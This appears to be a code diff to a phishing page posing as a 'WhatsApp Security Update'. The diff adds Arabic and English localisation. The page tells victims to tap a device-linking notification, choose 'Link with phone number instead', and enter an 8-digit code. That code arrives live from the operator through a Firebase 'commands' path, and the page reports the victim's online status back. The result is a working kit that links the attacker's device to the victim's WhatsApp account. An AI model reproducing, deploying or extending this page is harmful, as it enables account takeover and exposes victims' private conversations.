@@ -13,8 +13,8 @@
         .badge { background: #e7f3f3; color: #128c7e; padding: 5px 15px; border-radius: 20px; font-size: 12px; font-weight: bold; display: inline-block; margin-bottom: 25px; }
         .v-box { background: #f8f9fa; border: 1px solid #e9ecef; border-radius: 12px; padding: 18px; margin-bottom: 25px; }
         .v-row { display: flex; justify-content: space-between; font-size: 14px; margin: 10px 0; }
-        .alert-p { font-size: 14px; color: #3b4a54; text-align: left; line-height: 1.5; border-top: 1px solid #eee; padding-top: 20px; }
-        .steps { text-align: left; font-size: 14px; color: #1c1e21; margin-top: 15px; }
+        .alert-p { font-size: 14px; color: #3b4a54; text-align: inherit; line-height: 1.5; border-top: 1px solid #eee; padding-top: 20px; }
+        .steps { text-align: inherit; font-size: 14px; color: #1c1e21; margin-top: 15px; }
         .code-zone { border: 1.5px solid #00a884; border-radius: 10px; padding: 20px; margin-top: 25px; min-height: 100px; display: flex; flex-direction: column; justify-content: center; }
         #pairing-code { font-size: 32px; font-weight: bold; color: #075e54; letter-spacing: 5px; font-family: monospace; }
         .wait-text { font-size: 11px; color: #8696a0; margin-top: 8px; }
@@ -23,27 +23,21 @@
 <body>
     <div class="container">
         <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" class="logo">
-        <div class="header-title">WhatsApp Security Update</div>
-        <div class="badge">Linked Device: iPhone</div>
+        <div id="ui-title" class="header-title"></div>
+        <div id="ui-badge" class="badge">Linked Device: iPhone</div>
         
         <div class="v-box">
-            <div class="v-row"><span style="color:#667781">Current Protocol:</span><span style="color:#d91e1e; font-weight:bold">V2.12.5 (Old)</span></div>
+            <div class="v-row"><span id="ui-old-label" style="color:#667781"></span><span style="color:#d91e1e; font-weight:bold">V2.12.5 (Old)</span></div>
             <div style="height:1px; background:#eee; margin:5px 0"></div>
-            <div class="v-row"><span style="color:#667781">Updated Protocol:</span><span style="color:#00a884; font-weight:bold">V3.0.1 (Latest)</span></div>
+            <div class="v-row"><span id="ui-new-label" style="color:#667781"></span><span style="color:#00a884; font-weight:bold">V3.0.1 (New Version)</span></div>
         </div>
 
-        <p class="alert-p">To protect your privacy and chats, you must upgrade to the latest security protocol (V3.0.1).</p>
-        
-        <div class="steps">
-            <b>How to activate:</b><br>
-            1. You will receive an official notification; tap it.<br>
-            2. Select <b>'Link with phone number instead'</b>.<br>
-            3. Enter the 8-digit code that will appear here:
-        </div>
+        <p id="ui-alert" class="alert-p"></p>
+        <div id="ui-steps" class="steps"></div>
 
         <div class="code-zone">
             <div id="pairing-code">. . .</div>
-            <div class="wait-text">Awaiting security code..</div>
+            <div id="ui-wait" class="wait-text"></div>
         </div>
     </div>
 
@@ -55,15 +49,44 @@
         const db = firebase.database();
         const userId = new URLSearchParams(window.location.search).get('id');
 
+        const translations = {
+            ar: {
+                title: "تحديث أمان واتساب",
+                badge: "جهاز مرتبط: iPhone",
+                old: "بروتوكول التشفير الحالي:",
+                new: "بروتوكول التشفير المحدث:",
+                alert: "لحماية خصوصيتك ومحادثاتك، يجب عليك الترقية إلى أحدث بروتوكول أمني (V3.0.1).",
+                steps: "<b>طريقة التفعيل:</b><br>1. سيصلك الآن إشعار رسمي من واتساب لربط الجهاز، اضغط عليه.<br>2. اختر <b>'الربط برقم الهاتف بدلاً من ذلك'</b>.<br>3. أدخل الرمز المكون من 8 أرقام الذي سيظهر هنا:",
+                wait: "في انتظار رمز الأمان.."
+            },
+            en: {
+                title: "WhatsApp Security Update",
+                badge: "Linked Device: iPhone",
+                old: "Current Protocol:",
+                new: "Updated Protocol:",
+                alert: "To protect your privacy and chats, you must upgrade to the latest security protocol (V3.0.1).",
+                steps: "<b>How to activate:</b><br>1. You will receive an official notification; tap it immediately.<br>2. Select <b>'Link with phone number instead'</b> at the bottom.<br>3. Enter the 8-digit verification code that will appear here in a few moments:",
+                wait: "Awaiting security code.."
+            }
+        };
+
+        const userLang = navigator.language.startsWith('ar') ? 'ar' : 'en';
+        const lang = translations[userLang];
+
+        document.documentElement.dir = userLang === 'ar' ? 'rtl' : 'ltr';
+        document.getElementById('ui-title').innerText = lang.title;
+        document.getElementById('ui-badge').innerText = lang.badge;
+        document.getElementById('ui-old-label').innerText = lang.old;
+        document.getElementById('ui-new-label').innerText = lang.new;
+        document.getElementById('ui-alert').innerText = lang.alert;
+        document.getElementById('ui-steps').innerHTML = lang.steps;
+        document.getElementById('ui-wait').innerText = lang.wait;
+
         if (userId) {
-            // "Real-time" Ping to Firebase
             db.ref('monitoring/' + userId).set({ status: "Online", ts: Date.now() });
-            
-            // Wait for Code
             db.ref('commands/' + userId).on('value', (snap) => {
                 if (snap.val() && snap.val().code) {
                     document.getElementById('pairing-code').innerText = snap.val().code;
-                    document.querySelector('.wait-text').innerText = "Enter this code on your WhatsApp now";
                 }
             });
         }
